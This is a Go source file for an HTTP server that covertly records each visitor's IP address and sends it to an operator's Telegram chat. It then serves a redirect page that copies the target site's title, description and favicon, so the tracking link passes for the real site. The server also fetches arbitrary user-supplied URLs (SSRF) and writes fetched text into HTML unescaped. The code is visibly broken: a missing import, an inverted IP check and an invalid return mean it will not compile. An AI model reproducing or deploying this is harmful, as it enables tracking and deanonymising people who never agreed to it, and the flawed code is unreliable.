package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"

	"golang.org/x/net/html"
	"github.com/joho/godotenv"
)

type PageMetadata struct {
	Title       string
	Description string
	Favicon     string
}

func init() {
	err := godotenv.Load()
	if err != nil {
		log.Fatal("Error loading .env file")
	}
}

func extractMetadata(body io.Reader) PageMetadata {
	z := html.NewTokenizer(body)
	var meta PageMetadata

	for {
		tt := z.Next()
		switch {
		case tt == html.ErrorToken:
			return meta
		case tt == html.StartTagToken:
			t := z.Token()

			switch t.Data {
			case "title":
				z.Next()
				meta.Title = z.Token().Data
			case "meta":
				var name, content string
				for _, a := range t.Attr {
					if a.Key == "name" && a.Val == "description" {
						name = a.Val
					}
					if a.Key == "content" {
						content = a.Val
					}
				}
				if name == "description" {
					meta.Description = content
				}
			case "link":
				var rel, href string
				for _, a := range t.Attr {
					if a.Key == "rel" && (a.Val == "icon" || a.Val == "shortcut icon") {
						rel = a.Val
					}
					if a.Key == "href" {
						href = a.Val
					}
				}
				if rel != "" && href != "" && meta.Favicon == "" {
					meta.Favicon = href
				}
			}
		}
	}
}

func buildFaviconTag(faviconHref, baseURL string) string {
	if faviconHref == "" {
		return ""
	}
	parsedFavicon, err := url.Parse(faviconHref)
	if err != nil {
		return ""
	}
	if !parsedFavicon.IsAbs() {
		base, err := url.Parse(baseURL)
		if err != nil {
			return ""
		}
		parsedFavicon = base.ResolveReference(parsedFavicon)
	}
	return fmt.Sprintf(`<link rel="icon" href="%s">`, parsedFavicon.String())
}

func sendTelegramMessage(message string) {
	telegramToken := os.Getenv("TELEGRAM_BOT_TOKEN")
	chatID := os.Getenv("TELEGRAM_CHAT_ID")

	if telegramToken == "" || chatID == "" {
		log.Fatal("TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID is not set in environment variables")
	}

	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", telegramToken)
	data := url.Values{
		"chat_id": {chatID},
		"text":    {message},
	}

	fmt.Println("Sending message to chat_id:", chatID)

	_, err := http.PostForm(apiURL, data)
	if err != nil {
		log.Printf("Failed to send message to Telegram: %v", err)
	}
}

func logIp(w http.ResponseWriter, r *http.Request) {
	log.Println("headers:", r.Header)
	ip := r.Header.Get("X-Forwarded-For")
	if ip == "" {
		parts := strings.Split(ip, ",")
        return strings.TrimSpace(parts[0])
	}

	message := fmt.Sprintf("IP Address: %s", ip)
	fmt.Println(message)

	sendTelegramMessage(message)

	redirectURL := r.URL.Query().Get("redirect")
	if redirectURL != "" {
		_, err := url.ParseRequestURI(redirectURL)
		if err != nil {
			http.Error(w, "Invalid URL", http.StatusBadRequest)
			return
		}

		resp, err := http.Get(redirectURL)
		if err != nil || resp.StatusCode != 200 {
			http.Error(w, "Failed to fetch redirect target", http.StatusInternalServerError)
			return
		}
		defer resp.Body.Close()

		meta := extractMetadata(resp.Body)
		if meta.Title == "" {
			meta.Title = "Redirecting..."
		}

		w.Header().Set("Content-Type", "text/html")
		fmt.Fprintf(w, `<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta http-equiv="refresh" content="0;url=%s">
	<title>%s</title>
	<meta name="description" content="%s">
	%s
</head>
<body>
	<p>If you are not redirected automatically, <a href="%s">click here</a>.</p>
</body>
</html>`,
			redirectURL,
			meta.Title,
			meta.Description,
			buildFaviconTag(meta.Favicon, redirectURL),
			redirectURL)

		return
	}

	w.Write([]byte("IP Address logged, but no redirect URL provided"))
}

func main() {
	http.HandleFunc("/", logIp)
	fmt.Println("Server is running on port 8080")
	err := http.ListenAndServe(":8080", nil)
	if err != nil {
		log.Fatal(err)
	}
}
